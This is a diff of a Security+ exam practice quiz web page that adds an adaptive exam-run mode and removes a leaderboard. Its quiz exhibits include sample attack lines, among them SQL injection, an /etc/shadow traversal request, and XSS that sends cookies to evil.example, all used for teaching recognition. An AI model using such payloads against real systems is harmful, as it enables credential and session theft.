@@ -6,17 +6,17 @@
 <meta name="theme-color" content="#050a0e">
 <meta name="apple-mobile-web-app-capable" content="yes">
 <title>Free Security+ SY0-701 Practice Quiz Games | ET Labs</title>
-<meta name="description" content="Free CompTIA Security+ (SY0-701) practice covering the whole exam: all 5 domains and 28 objectives. Drill 700+ terms and acronyms, 400+ exam-style scenarios, a mix, or performance-based (PBQ) tasks, with a live nickname leaderboard.">
+<meta name="description" content="Free CompTIA Security+ (SY0-701) practice covering the whole exam: all 5 domains and 28 objectives. One mode, Exam Run: 30-question runs of exam-style scenarios and performance-based (PBQ) tasks, timed, weighted toward your weak domains, with readiness tracking. Progress stays on your device.">
 <link rel="canonical" href="https://etlabs.app/study/">
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebApplication","name":"Security+ Study: Hack the Quiz","url":"https://etlabs.app/study/","description":"Free CompTIA Security+ (SY0-701) practice quiz games covering all 5 exam domains and 28 objectives: terms, 400+ exam-style scenarios, a mix, or PBQ practice, with a nickname leaderboard.","applicationCategory":"EducationalApplication","operatingSystem":"Any (web browser)","browserRequirements":"Requires JavaScript","isAccessibleForFree":true,"offers":{"@type":"Offer","price":"0","priceCurrency":"USD"},"publisher":{"@type":"Organization","@id":"https://etlabs.app/#organization","name":"ET Labs","url":"https://etlabs.app/"}}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebApplication","name":"Security+ Study: Hack the Quiz","url":"https://etlabs.app/study/","description":"Free CompTIA Security+ (SY0-701) practice practice covering all 5 exam domains and 28 objectives in one mode, Exam Run: timed 30-question runs of 400+ scenarios and PBQ tasks, weighted to your weak domains, with readiness tracking. Progress stays on your device.","applicationCategory":"EducationalApplication","operatingSystem":"Any (web browser)","browserRequirements":"Requires JavaScript","isAccessibleForFree":true,"offers":{"@type":"Offer","price":"0","priceCurrency":"USD"},"publisher":{"@type":"Organization","@id":"https://etlabs.app/#organization","name":"ET Labs","url":"https://etlabs.app/"}}</script>
 <meta property="og:title" content="Free Security+ SY0-701 Practice Quiz Games | ET Labs">
-<meta property="og:description" content="Hacker-style CompTIA Security+ SY0-701 practice for the whole exam: all 5 domains, 700+ terms, 400+ scenarios, PBQ tasks. Choose Terms, Scenarios, Mixed, or PBQ and climb the leaderboard.">
+<meta property="og:description" content="Hacker-style CompTIA Security+ SY0-701 practice for the whole exam: all 5 domains in one Exam Run mode: timed 30-question runs of 400+ scenarios and PBQs that focus on your weak domains. Track your readiness; progress stays on your device.">
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://etlabs.app/study/">
 <meta property="og:site_name" content="ET Labs">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Free Security+ SY0-701 Practice Quiz Games | ET Labs">
-<meta name="twitter:description" content="Hacker-style CompTIA Security+ SY0-701 practice for the whole exam: all 5 domains, 700+ terms, 400+ scenarios, PBQ tasks. Choose Terms, Scenarios, Mixed, or PBQ and climb the leaderboard.">
+<meta name="twitter:description" content="Hacker-style CompTIA Security+ SY0-701 practice for the whole exam: all 5 domains in one Exam Run mode: timed 30-question runs of 400+ scenarios and PBQs that focus on your weak domains. Track your readiness; progress stays on your device.">
 <script>
 /* ==== DECK START =====================================================
    CompTIA Security+ SY0-701, whole exam, organized by the official 5 domains and
@@ -1250,10 +1250,20 @@ const SCEN_ALL = [
 {"o":"2.4","q":"A redirect parameter contains the characters below before a new header. Spot the red clue: which attack is this?","payload":"\\r\\n","clue":"\\r\\n","options":["Directory traversal","Server-side template injection (SSTI)","Command injection","CRLF / header injection"],"answer":3,"why":"Red clue: \\r\\n is carriage return + line feed, a visual clue for CRLF / header injection (handout table)."},
 {"o":"2.4","q":"A program that prints user input receives the specifier below. Spot the red clue: which attack is this?","payload":"%n","clue":"%n","options":["Command injection","XML injection","CRLF / header injection","Format string attack"],"answer":3,"why":"Red clue: %n is a format specifier, a strong clue for a format string attack (handout)."},
 {"o":"2.4","q":"A logging function that prints user input receives the specifier below. Spot the red clue: which attack is this?","payload":"%p","clue":"%p","options":["Format string attack","Command injection","Cross-site scripting (XSS)","XML injection"],"answer":0,"why":"Red clue: %p is a format specifier, a strong clue for a format string attack (handout)."},
-{"o":"2.4","q":"Angle brackets alone don't prove XSS, because HTML and XML both use them. Which of these is the strongest XSS clue?","options":["\u003crole>admin\u003c/role>","Angle brackets in HTML","\u003cb>bold\u003c/b> formatting tags","onerror= (an event handler)"],"answer":3,"why":"Look for executable browser-side content such as \u003cscript>, javascript:, or an event handler such as onerror= (handout exam reminder)."}
+{"o":"2.4","q":"Angle brackets alone don't prove XSS, because HTML and XML both use them. Which of these is the strongest XSS clue?","options":["\u003crole>admin\u003c/role>","Angle brackets in HTML","\u003cb>bold\u003c/b> formatting tags","onerror= (an event handler)"],"answer":3,"why":"Look for executable browser-side content such as \u003cscript>, javascript:, or an event handler such as onerror= (handout exam reminder)."},
+/* 2026-10-13 exam run: thin 4.1 / 4.9 */
+{"o":"4.9","q":"An investigator wants a single visual screen showing alert trends from several security tools over the past week. Which data source fits?","options":["Packet capture","Firewall rule set","Certificate revocation list","Dashboard"],"answer":3,"why":"Dashboards summarize data from many sources visually for quick investigation."},
+{"o":"4.9","q":"Every Monday the SIEM emails a generated summary of failed logins from the past week. Which data source is this?","options":["Packet capture","Endpoint log","Automated report","Vulnerability scan"],"answer":2,"why":"Automated reports are generated on a schedule from collected data."},
+{"o":"4.9","q":"After seeing an exploit attempt, an analyst checks recent scan results to confirm whether the targeted host actually had that weakness. Which data source is used?","options":["Dashboard","Vulnerability scan","DNS log","Metadata"],"answer":1,"why":"Vulnerability scan output shows which hosts had known weaknesses, supporting the investigation."},
+{"o":"4.9","q":"A web application recorded a database error each time an attacker sent a crafted request. Which log source shows this?","options":["Firewall log","Application log","OS security log","Packet capture of DNS"],"answer":1,"why":"Application logs record events from the application itself, such as errors and transactions."},
+{"o":"4.1","q":"Admins regularly compare servers to the approved secure configuration and fix any drift they find. Which part of secure baselines is this?","options":["Establish","Deploy","Decommission","Maintain"],"answer":3,"why":"Secure baselines are established, deployed, then maintained by checking and correcting drift."},
+{"o":"4.1","q":"The company buys and owns the phones but lets employees also use them personally. Which mobile deployment model is this?","options":["BYOD (bring your own device)","CYOD (choose your own device)","COPE (corporate-owned, personally enabled)","VDI only"],"answer":2,"why":"COPE devices are owned by the company and enabled for personal use."},
+{"o":"4.1","q":"A wireless network uses WPA3, which replaces the pre-shared key handshake with a stronger exchange. What is that exchange called?","options":["TKIP","WEP","SAE (Simultaneous Authentication of Equals)","WPS PIN"],"answer":2,"why":"WPA3 uses SAE in place of WPA2's PSK four-way handshake."},
+{"o":"4.1","q":"A developer validates form input in the browser, but attackers bypass it with a proxy. Where must validation also happen?","options":["Only in the browser","In the DNS server","In the user's email client","On the server"],"answer":3,"why":"Client-side checks can be bypassed; input must be validated on the server."},
+{"o":"4.1","q":"Downloaded attachments are opened in an isolated environment so any malware can't affect the real system. What technique is this?","options":["Sandboxing","Code signing","Tokenization","Hashing"],"answer":0,"why":"Sandboxing runs untrusted code in an isolated environment."}
 ];
 /* round sizes (random draw from the selected pool each run). Must match STUDY_EXAM_DECK in workers/router.js */
-const ROUND = { terms: 30, scen: 20, mixed: 12, cert: 12 };
+const ROUND = { terms: 30, scen: 20, mixed: 12, cert: 12, run: 30 };   // run = Exam Run: 26 scenarios + 4 PBQs
 /* PBQ practice: {o, title, prompt, exhibit, items:[[label, answer]], choices, why}. Every answer must be one of choices. */
 const PBQ_ALL = [
 {"o":"2.4","title":"LOG ANALYSIS: WEB SERVER","prompt":"Review each log entry from a web server. Choose the attack (or normal traffic) shown in each line.","exhibit":"[1] GET /products.php?id=10%20UNION%20SELECT%20username,password%20FROM%20users HTTP/1.1\n[2] GET /download?file=../../../../etc/shadow HTTP/1.1\n[3] GET /search?q=\u003cscript>document.location='http://evil.example/?c='+document.cookie\u003c/script>\n[4] auth: 203.0.113.50 one failed login each for 60 different accounts in 2 min, same password\n[5] GET /index.html HTTP/1.1 200","items":[["Line 1","SQL injection"],["Line 2","Directory traversal"],["Line 3","Cross-site scripting (XSS)"],["Line 4","Password spraying"],["Line 5","Normal traffic"]],"choices":["SQL injection","Directory traversal","Cross-site scripting (XSS)","Password spraying","Normal traffic","Buffer overflow"],"why":"UNION SELECT = SQLi; ../ = traversal; \u003cscript> stealing cookies = XSS; one attempt per account with a common password = spraying; a plain 200 for a page is normal."},
@@ -1546,6 +1556,11 @@ button{font:inherit;color:inherit;cursor:pointer;border:0;background:none}
 .rdrow .bar{flex:1;height:8px;border-radius:8px;background:#0b1820;border:1px solid var(--line);overflow:hidden}
 .rdrow .bar i{display:block;height:100%;background:var(--red)} .rdrow.mid .bar i{background:var(--amber)} .rdrow.hi .bar i{background:var(--green)}
 .rdrow .pc{width:72px;text-align:right;color:var(--text)}
+.rdh{margin:12px 0 4px;color:var(--cyan);font-size:11px;letter-spacing:.14em}
+.rdl{color:var(--text);line-height:1.6;font-size:12.5px}
+.spark{color:var(--green);letter-spacing:1px;font-size:15px}
+.privacy{font-family:var(--mono);font-size:12px;color:var(--green);margin:10px 0 6px;text-align:center}
+.runinfo{font-family:var(--mono);font-size:12px;color:var(--dim);margin:8px 0}
 .rdstat{margin-top:8px;color:var(--amber)} .rdstat.go{color:var(--green);text-shadow:0 0 10px rgba(57,255,136,.5)}
 /* static render for ?demo= screenshots */
 html.demo .screen,html.demo .o,html.demo .why{animation:none!important}
@@ -1562,7 +1577,7 @@ html.demo .screen,html.demo .o,html.demo .why{animation:none!important}
     <div class="logo">root@<b>secplus</b>:~$ ./quiz --deck</div>
     <h1 class="title"><span class="glow-g" id="tTop">Security+ Study</span><br><span class="glitch glow-c" id="tMain" data-t="Hack the Quiz">Hack the Quiz</span></h1>
     <div class="sub" id="tSub"></div>
-    <p class="sub" style="font-size:13px;line-height:1.6;margin:12px 0 20px">CompTIA Security+ (SY0-701) practice for the whole exam: every domain and objective (1.1&ndash;5.6) in CompTIA's published exam objectives. Drill terms and acronyms, 400+ exam-style scenarios, performance-based (PBQ) tasks, and certificate anatomy. Independent study tool, not affiliated with or endorsed by CompTIA.</p>
+    <p class="sub" style="font-size:13px;line-height:1.6;margin:12px 0 20px">CompTIA Security+ (SY0-701) practice for the whole exam: every domain and objective (1.1&ndash;5.6) in CompTIA's published exam objectives. One mode, Exam Run: timed 30-question runs of 400+ exam-style scenarios and performance-based (PBQ) tasks, weighted toward your weak domains, with readiness tracking and term review for what you miss. Independent study tool, not affiliated with or endorsed by CompTIA.</p>
     <div class="term" id="bootlog"></div>
     <div class="stats3">
       <div class="stat"><div class="k" id="stCardsK">Cards</div><div class="v glow-c" id="stCards">0</div></div>
@@ -1570,23 +1585,22 @@ html.demo .screen,html.demo .o,html.demo .why{animation:none!important}
       <div class="stat"><div class="k">Best streak</div><div class="v" style="color:var(--amber)" id="stBest">0</div></div>
     </div>
     <div class="opts-set">
-      <div class="modepick daypick"><div class="lbl">Domain<small id="domHint"></small></div>
+      <div class="modepick daypick" hidden style="display:none"><div class="lbl">Domain<small id="domHint"></small></div>
         <div class="seg" id="domSeg"><span data-v="all" title="Full exam: all 5 domains">ALL</span><span data-v="1" title="1.0 General Security Concepts">1</span><span data-v="2" title="2.0 Threats, Vulnerabilities &amp; Mitigations">2</span><span data-v="3" title="3.0 Security Architecture">3</span><span data-v="4" title="4.0 Security Operations">4</span><span data-v="5" title="5.0 Security Program Management &amp; Oversight">5</span></div>
         <div class="domname" id="domName"></div></div>
-      <div class="modepick"><div class="lbl">Mode<small id="modeHint"></small></div>
+      <div class="modepick" hidden style="display:none"><div class="lbl">Mode<small id="modeHint"></small></div>
         <div class="seg" id="modeSeg"><span data-v="terms">TERMS</span><span data-v="scen">SCENARIOS</span><span data-v="mixed">MIXED</span><span data-v="cert" class="certopt">CERT ANATOMY</span><span data-v="pbq">PBQ</span></div></div>
-      <button class="tog" id="togMode"><span class="lbl">Show first<small>For term cards (Terms &amp; Mixed)</small></span>
+      <button class="tog" id="togMode" hidden style="display:none"><span class="lbl">Show first<small>For term cards (Terms &amp; Mixed)</small></span>
         <span class="seg"><span data-v="0">WORD</span><span data-v="1">MEANING</span></span></button>
       <button class="tog on" id="togTimer" aria-disabled="true"><span class="lbl">Countdown: always on<small>30s minimum per question · longer questions and PBQs get more · faster = bonus</small></span><span class="pill"></span></button>
       <button class="tog" id="togSound"><span class="lbl">Sound FX<small>Retro beeps</small></span><span class="pill"></span></button>
     </div>
     <div class="spacer"></div>
-    <button class="btn" id="bStart">&gt; Start hack</button>
-    <div class="lb ready" id="rdStart"><h3><span>READINESS // LAST 10 PLAYS</span></h3><div class="rdbody"></div></div>
-    <div class="lb start" id="lbStart">
-      <h3><span id="lbStartH">LEADERBOARD</span></h3>
-      <ol class="lblist" id="lbStartList"><li class="empty">&gt; fetching scores ...</li></ol>
-    </div>
+    <div class="sub runinfo" id="runInfo"></div>
+    <button class="btn" id="bStart">&gt; Start exam run</button>
+    <div class="sub privacy">&gt; Progress is saved only on this device and never sent anywhere.</div>
+    <button class="btn alt" id="bClear">Clear my progress</button>
+    <div class="lb ready" id="rdStart"><h3><span>READINESS + FOCUS // LAST 10 RUNS</span></h3><div class="rdbody"></div></div>
   </section>
 
   <!-- ===== GAME ===== -->
@@ -1627,20 +1641,12 @@ html.demo .screen,html.demo .o,html.demo .why{animation:none!important}
       <div class="stat"><div class="k">Accuracy</div><div class="v glow-c" id="eAcc">0%</div></div>
       <div class="stat"><div class="k">Best streak</div><div class="v" style="color:var(--amber)" id="eStreak">0</div></div>
     </div>
-    <div class="lb" id="lb">
-      <h3><span id="lbH">LEADERBOARD</span></h3>
-      <form class="lbform" id="lbForm" autocomplete="off" novalidate>
-        <input id="lbNick" maxlength="16" placeholder="nickname (2-16)" autocapitalize="off" autocorrect="off" spellcheck="false" enterkeyhint="send" aria-label="Nickname">
-        <button type="submit" class="lbbtn" id="lbBtn">Submit score</button>
-        <div id="lbTs" class="lbts"></div>
-      </form>
-      <div class="lbmsg" id="lbMsg"></div>
-      <ol class="lblist" id="lbList"></ol>
-    </div>
-    <div class="lb ready" id="rdEnd"><h3><span>READINESS // LAST 10 PLAYS</span></h3><div class="rdbody"></div></div>
+    <div class="lb ready" id="rdEnd"><h3><span>READINESS + FOCUS // LAST 10 RUNS</span></h3><div class="rdbody"></div></div>
+    <div class="lb ready" id="weakBox"><h3><span>WEAK TOPICS // THIS RUN</span></h3><div class="rdbody" id="weakBody"></div></div>
+    <div class="missed"><h3>TERM REVIEW // TIED TO YOUR MISSES</h3><ul id="termReview"></ul></div>
     <div class="missed"><h3 id="missedH">MISSED — REVIEW THESE</h3><ul id="missedList"></ul></div>
     <button class="btn warn" id="bRetryMissed">&#x21BB; Retry missed only</button>
-    <button class="btn" id="bAgain">&gt; Full run again</button>
+    <button class="btn" id="bAgain">&gt; Next exam run</button>
     <button class="btn alt" id="bMenu">Main menu</button>
     <div class="foot" id="endHigh"></div>
   </section>
@@ -1670,7 +1676,7 @@ const STORE = "hackquiz:study-site";
 const domLabel = d => d === "all" ? "Full exam" : "Domain " + d;
 const domOf = x => x.o.split(".")[0];
 let CARDS = [], SCEN = [], PBQ = [], DECK_SUBTITLE = "";
-const MODES = { terms:"Terms", scen:"Scenarios", mixed:"Mixed", cert:"Cert Anatomy", pbq:"PBQ" };
+const MODES = { terms:"Terms", scen:"Scenarios", mixed:"Mixed", cert:"Cert Anatomy", pbq:"PBQ", run:"Exam Run" };
 
 /* normalize scenario answers: index (0-3) or exact option text */
 SCEN_ALL.forEach((s, i) => {
@@ -1697,11 +1703,10 @@ delete settings.day;                       // old class-day setting (Day 1/Day 2
 // The whole exam is the default on every visit; only a ?domain= link narrows it.
 // Legacy ?day=day1|day2|all links (and /study/day1 redirects) open the whole exam.
 const qs = new URLSearchParams(location.search);
-settings.domain = qs.get("domain") || "all";
-if(qs.get("mode")) settings.mode = qs.get("mode");
+settings.domain = "all";      // Exam Run always draws from the whole exam (domain mix is adaptive)
+settings.mode = "run";
 setDeck(settings.domain);
-if(!MODES[settings.mode] || (!SCEN.length && settings.mode !== "terms")) settings.mode = "terms";
-if(qs.has("day") || (settings.mode === "cert" && !certOK())){ if(!certOK()) settings.mode = "terms"; setTimeout(syncUrl, 0); }
+if(qs.has("day") || qs.has("mode") || qs.has("domain")) setTimeout(syncUrl, 0);
 // high score + best streak are kept per domain + mode, e.g. highs["sy0701:all:scen"] (old "day1:terms" keys are ignored)
 const highs = Object.assign({}, saved.highs || {});
 const bests = Object.assign({}, saved.bests || {});
@@ -1711,11 +1716,11 @@ function persist(){ if(/demo=/.test(location.search)) return; save({ settings, h
 /* ---------- completion badges + leaderboard API (optional; the quiz works without it) ----------
    Server deck keys: whole exam -> "exam", domain N -> "dN". The old class-day boards ("1", "2", "all")
    stay in the database untouched but are no longer shown; their round lengths don't match these rounds. */
-const PROGRESS = "etlabs:study:progress", NICK = "etlabs:study:nick", API = "/study/api/";
+const PROGRESS = "etlabs:study:progress";
 const isDemo = () => /demo=/.test(location.search);
 function syncUrl(){
   if(isDemo() || location.protocol === "file:") return;
-  try{ history.replaceState(null, "", location.pathname + "?" + (settings.domain !== "all" ? "domain=" + encodeURIComponent(settings.domain) + "&" : "") + "mode=" + encodeURIComponent(settings.mode) + location.hash); }catch(e){}
+  try{ history.replaceState(null, "", location.pathname + (settings.mode === "run" ? "" : "?" + (settings.domain !== "all" ? "domain=" + encodeURIComponent(settings.domain) + "&" : "") + "mode=" + encodeURIComponent(settings.mode)) + location.hash); }catch(e){}
 }
 const dayKey = d => d === "all" ? "exam" : "d" + d;
 function loadProgress(){ try{ return JSON.parse(localStorage.getItem(PROGRESS)) || {}; }catch(e){ return {}; } }
@@ -1731,112 +1736,8 @@ function syncBadges(){
   const cur = p[dayKey(settings.domain)] || {};
   $("modeSeg").querySelectorAll("span").forEach(x => x.classList.toggle("done", !!cur[x.dataset.v]));
 }
-function api(path, body){
-  if(location.protocol === "file:") return Promise.resolve(null);
-  const ctl = typeof AbortController !== "undefined" ? new AbortController() : null;
-  const to = setTimeout(() => ctl && ctl.abort(), 6000);
-  const opt = body ? { method:"POST", headers:{ "content-type":"application/json" }, body:JSON.stringify(body) } : {};
-  if(ctl) opt.signal = ctl.signal;
-  return fetch(API + path, opt).then(r => r.json().catch(() => null).then(j => j || { ok:false, error:"http_" + r.status }))
-    .catch(() => null).finally(() => clearTimeout(to));
-}
-let roundNonce = null, runId = 0, lbSubmitted = false, runDay = "all", startBoardReq = 0;
-/* Cloudflare Turnstile (anti-bot) for score posts: enabled only when the server publishes a site key. */
-let tsSiteKey = null, tsWidget = null, tsLoading = null;
-function tsLoad(){
-  if(tsLoading) return tsLoading;
-  tsLoading = new Promise((res, rej) => {
-    const s = document.createElement("script");
-    s.src = "https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit";
-    s.async = true; s.onload = () => res(); s.onerror = () => { tsLoading = null; rej(new Error("turnstile_load")); };
-    document.head.appendChild(s);
-  });
-  return tsLoading;
-}
-function tsRender(){
-  if(!tsSiteKey) return;
-  tsLoad().then(() => {
-    if(!window.turnstile) return;
-    if(tsWidget !== null){ try{ window.turnstile.reset(tsWidget); }catch(e){} return; }
-    tsWidget = window.turnstile.render("#lbTs", { sitekey: tsSiteKey, action: "study_score", appearance: "interaction-only", theme: "dark" });
-  }).catch(() => {});
-}
-function tsToken(){ try{ return tsWidget !== null && window.turnstile ? window.turnstile.getResponse(tsWidget) || "" : ""; }catch(e){ return ""; } }
-function tsReset(){ try{ if(tsWidget !== null && window.turnstile) window.turnstile.reset(tsWidget); }catch(e){} }
-if(location.protocol !== "file:") api("config").then(r => { if(r && r.ok && r.turnstileSiteKey) tsSiteKey = r.turnstileSiteKey; });
-function requestRound(day, mode){
-  if(mode === "pbq"){ runId++; roundNonce = null; return; }
-  const my = ++runId; roundNonce = null;
-  if(isDemo()) return;
-  api("round", { day:dayKey(day), mode }).then(r => { if(my === runId && r && r.ok && r.nonce) roundNonce = r.nonce; });
-}
-const LB_ERR = {
-  nick_too_short:"Nickname needs at least 2 characters.", nick_too_long:"Nickname max is 16 characters.",
-  nick_bad_chars:"Use letters, numbers, space, _ . - only.", nick_not_allowed:"That nickname isn't allowed. Pick another.",
-  nick_reserved:"That nickname is reserved.", nick_required:"Enter a nickname.", rate_limited:"Too many submissions. Try again in a few minutes.",
-  too_fast:"Round finished too fast to rank.", nonce_used:"This round was already submitted.", round_expired:"Round expired (2h). Play again to rank.",
-  bad_nonce:"Leaderboard didn't register this round.", bad_score:"Score rejected.", storage_unavailable:"Leaderboard is offline right now.",
-  turnstile_required:"Finish the quick human check, then submit.", turnstile_failed:"Human check failed. Try again.", turnstile_unavailable:"Human check is unavailable right now. Try again shortly."
-};
-const fmtT = s => Math.floor(s / 60) + ":" + String(s % 60).padStart(2, "0");
-const boardTitle = (day, mode) => "LEADERBOARD // " + domLabel(day).toUpperCase() + " · " + MODES[mode].toUpperCase();
-function lbMsg(t, cls){ $("lbMsg").textContent = t || ""; $("lbMsg").className = "lbmsg" + (cls ? " " + cls : ""); }
-function fillBoard(ul, day, mode, meNick, isCurrent){
-  api("leaderboard?day=" + encodeURIComponent(dayKey(day)) + "&mode=" + mode + "&limit=10" + (meNick ? "&t=" + Date.now() : "")).then(r => {
-    if(isCurrent && !isCurrent()) return;
-    if(!r || !r.ok){ ul.innerHTML = "<li class='empty'>&gt; leaderboard offline — quizzes still work</li>"; return; }
-    if(!r.entries.length){ ul.innerHTML = "<li class='empty'>&gt; no scores yet. Finish a full run to claim #1.</li>"; return; }
-    ul.innerHTML = r.entries.map(e => "<li" + (meNick && e.nick.toLowerCase() === meNick.toLowerCase() ? " class='me'" : "") + "><span class='r'>#" + e.rank +
-      "</span><span class='n'>" + esc(e.nick) + "</span><span class='s'>" + e.score + "/" + e.questions + "</span><span class='t'>" + fmtT(e.durationSec) + "</span></li>").join("");
-  });
-}
-function loadStartBoard(){
-  if(settings.mode === "pbq"){ ++startBoardReq; $("lbStartH").textContent = "LEADERBOARD // PBQ"; $("lbStartList").innerHTML = "<li class='empty'>&gt; PBQ practice is untimed and not ranked</li>"; renderReadiness(); return; }
-  renderReadiness();
-  const my = ++startBoardReq, day = settings.domain, mode = settings.mode;
-  $("lbStartH").textContent = boardTitle(day, mode);
-  $("lbStartList").innerHTML = "<li class='empty'>&gt; fetching scores ...</li>";
-  fillBoard($("lbStartList"), day, mode, null, () => my === startBoardReq);
-}
-function renderBoard(day, mode, canSubmit){
-  lbSubmitted = false;
-  $("lbH").textContent = boardTitle(day, mode);
-  $("lbList").innerHTML = "<li class='empty'>&gt; fetching scores ...</li>";
-  let nick = ""; try{ nick = localStorage.getItem(NICK) || ""; }catch(e){}
-  $("lbNick").value = nick; $("lbBtn").disabled = false;
-  $("lbForm").style.display = canSubmit ? "flex" : "none";
-  if(canSubmit) tsRender();
-  lbMsg(canSubmit ? correct + "/" + order.length + " correct — submit it under a nickname?" : (review ? "Review rounds aren't ranked. Play a full round to submit." : isDemo() ? "Demo view — submit disabled." : ""));
-  fillBoard($("lbList"), day, mode);
-}
-$("lbForm").onsubmit = e => {
-  e.preventDefault();
-  if(lbSubmitted) return;
-  const nick = $("lbNick").value.trim().replace(/\s+/g, " ");
-  if(nick.length < 2) return lbMsg(LB_ERR.nick_too_short, "bad");
-  if(nick.length > 16) return lbMsg(LB_ERR.nick_too_long, "bad");
-  if(!/^[A-Za-z0-9 _.\-]+$/.test(nick)) return lbMsg(LB_ERR.nick_bad_chars, "bad");
-  if(!roundNonce) return lbMsg("Leaderboard is offline (or didn't register this round). Your run still counts locally.", "bad");
-  const turnstileToken = tsToken();
-  if(tsSiteKey && !turnstileToken){ tsRender(); return lbMsg(LB_ERR.turnstile_required, "bad"); }
-  $("lbBtn").disabled = true; lbMsg("> transmitting ...");
-  const mode = runMode, day = runDay;
-  const payload = { nonce:roundNonce, day:dayKey(day), mode, nick, score:correct };
-  if(turnstileToken) payload.turnstileToken = turnstileToken;
-  api("score", payload).then(r => {
-    tsReset();
-    if(r && r.ok){
-      lbSubmitted = true; roundNonce = null; $("lbForm").style.display = "none";
-      try{ localStorage.setItem(NICK, r.entry.nick); }catch(e){}
-      lbMsg(r.hidden ? "> test score accepted (TEST_ nicks are hidden from the board)." : "> score uploaded. You're #" + r.rank + " in " + domLabel(day) + " " + MODES[mode] + ".", "ok");
-      fillBoard($("lbList"), day, mode, r.entry.nick);
-    } else {
-      $("lbBtn").disabled = false;
-      lbMsg(r ? (LB_ERR[r.error] || "Submit failed (" + r.error + ").") : "Leaderboard is offline. Your run still counts locally.", "bad");
-      if(r && (r.error === "nonce_used" || r.error === "too_fast" || r.error === "round_expired" || r.error === "bad_nonce")) $("lbBtn").disabled = true;
-    }
-  });
-};
+/* leaderboard removed 2026-10-13: the study page makes no server calls; progress stays on this device */
+let runDay = "all";
 
 /* ---------- helpers ---------- */
 const shuffle = a => { a = a.slice(); for(let j=a.length-1;j>0;j--){ const k=Math.floor(Math.random()*(j+1)); [a[j],a[k]]=[a[k],a[j]]; } return a; };
@@ -2147,17 +2048,18 @@ function certFocus(id, state){
 }
 /* every run is a fresh random draw from the selected pool (whole exam or one domain) */
 function fullPool(mode){
+  if(mode === "run") return buildRun();
   if(mode === "cert") return shuffle(certIds()).slice(0, ROUND.cert);
   if(mode === "scen") return pickFresh(scenIds(), ROUND.scen);
   if(mode === "pbq") return pickFresh(pbqIds(), PBQ_ROUND);
   if(mode === "mixed") return pickFresh(termIds(), MIXED_EACH).concat(pickFresh(scenIds(), MIXED_EACH));
   return pickFresh(termIds(), ROUND.terms);
 }
-const fullLen = mode => mode === "pbq" ? Math.min(PBQ_ROUND, PBQ.length) : mode === "cert" ? Math.min(ROUND.cert, CERT_FIELDS.length) : mode === "scen" ? Math.min(ROUND.scen, SCEN.length) : mode === "mixed" ? Math.min(MIXED_EACH, CARDS.length) + Math.min(MIXED_EACH, SCEN.length) : Math.min(ROUND.terms, CARDS.length);
+const fullLen = mode => mode === "run" ? ROUND.run : mode === "pbq" ? Math.min(PBQ_ROUND, PBQ.length) : mode === "cert" ? Math.min(ROUND.cert, CERT_FIELDS.length) : mode === "scen" ? Math.min(ROUND.scen, SCEN.length) : mode === "mixed" ? Math.min(MIXED_EACH, CARDS.length) + Math.min(MIXED_EACH, SCEN.length) : Math.min(ROUND.terms, CARDS.length);
 const parseId = id => ({ kind: id[0], i: +id.slice(2) });
 
 /* ---------- state ---------- */
-let runDom = {}, order = [], idx = 0, score = 0, streak = 0, bestStreak = 0, correct = 0, missed = [], locked = false, review = false, runMode = "terms";
+let runStartT = 0, runDom = {}, order = [], idx = 0, score = 0, streak = 0, bestStreak = 0, correct = 0, missed = [], locked = false, review = false, runMode = "terms";
 let tStart = 0, raf = 0, lastTick = -1, advanceTO = 0, limit = TIME_MIN;
 const RING_C = 2 * Math.PI * 24;
 $("ringFg").style.strokeDasharray = RING_C;
@@ -2192,7 +2094,7 @@ function syncToggles(){
   $("togMode").classList.toggle("off", m === "scen" || m === "cert" || m === "pbq");
   $("togMode").querySelectorAll(".seg span").forEach(s => s.classList.toggle("sel", (s.dataset.v === "1") === settings.rev));
   $("bMute").innerHTML = settings.sound ? "&#x1F50A;" : "&#x1F507;";
-  syncBadges(); loadStartBoard();
+  syncBadges(); renderReadiness();
 }
 let bootRun = 0;
 function bootLog(){
@@ -2218,7 +2120,7 @@ function startGame(ids){
   runMode = settings.mode; review = !!ids;
   order = shuffle(ids || fullPool(runMode));
   idx = 0; score = 0; streak = 0; bestStreak = 0; correct = 0; missed = []; runDay = settings.domain; runDom = {};
-  if(review){ runId++; roundNonce = null; } else requestRound(runDay, runMode);
+  runStartT = Date.now();
   $("score").textContent = "0"; updateStreak(); show("sGame"); audio(); question();
 }
 function question(){
@@ -2297,6 +2199,7 @@ function answer(btn){
   const buttons = [...$("opts").children], rightBtn = buttons.find(b => b.dataset.ok);
   const ok = btn && btn.dataset.ok;
   if(scen) tally(SCEN[it.i], ok ? 1 : 0);
+  if(scen) noteResult(order[idx], !!ok);
   buttons.forEach(b => { if(b !== rightBtn && b !== btn) b.classList.add("dim"); });
   rightBtn.classList.add("right");
   if(cert) certFocus(CERT_FIELDS[it.i].id, ok ? "ok" : "bad");
@@ -2397,7 +2300,7 @@ function pbqSubmit(p, timedOut){
     if(ok) right++; else { const fx = document.createElement("span"); fx.className = "fix"; fx.textContent = "answer: " + want; r.querySelector(".pl").appendChild(fx); } });
   $("pbqSubmit").remove();
   const frac = right / rows.length, all = right === rows.length;
-  tally(p, frac);
+  tally(p, frac); noteResult(order[idx], all);
   if(all){ streak++; correct++; bestStreak = Math.max(bestStreak, streak); const m = multFor(streak), pts = BASE_POINTS * 2 * m;
     score += pts; bumpScore(pts, m); flash("g"); sfx.right(); $("fb").className = "feedback ok"; $("fb").textContent = "> TASK COMPLETE " + right + "/" + rows.length + "  +" + pts;
     if(LEVELS[streak]) levelUp(LEVELS[streak]); }
@@ -2417,6 +2320,9 @@ function loadReady(){ try{ return JSON.parse(localStorage.getItem(READY)) || [];
 function recordPlay(){
   if(isDemo() || !Object.keys(runDom).length) return;
   try{ const r = loadReady(); r.push({ t: Date.now(), m: runMode, d: runDom }); localStorage.setItem(READY, JSON.stringify(r.slice(-READY_N))); }catch(e){}
+  if(runMode === "run"){ const st = loadRun(); st.n = (st.n || 0) + 1; const rd = readiness();
+    st.hist = (st.hist || []).concat([{ t: Date.now(), acc: Math.round(correct / Math.max(1, order.length) * 100), r: rd.weighted, sec: Math.round((Date.now() - runStartT) / 1000) }]).slice(-300);
+    saveRun(st); }
 }
 function readiness(){
   const sum = {}; Object.keys(DOMAINS).forEach(d => sum[d] = [0, 0]);
@@ -2439,11 +2345,124 @@ function renderReadiness(){
